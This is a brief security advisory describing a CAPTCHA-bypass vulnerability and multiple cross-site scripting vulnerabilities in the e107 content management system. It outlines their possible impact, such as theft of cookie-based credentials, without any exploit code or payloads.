e107 is prone to a security-bypass vulnerability and multiple cross-site scripting vulnerabilities.

Successfully exploiting the security-bypass issue will allow an attacker to bypass the 'CAPTCHA' security mechanism. This may lead to other attacks.

The attacker could exploit the cross-site scripting issues to execute arbitrary script code in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
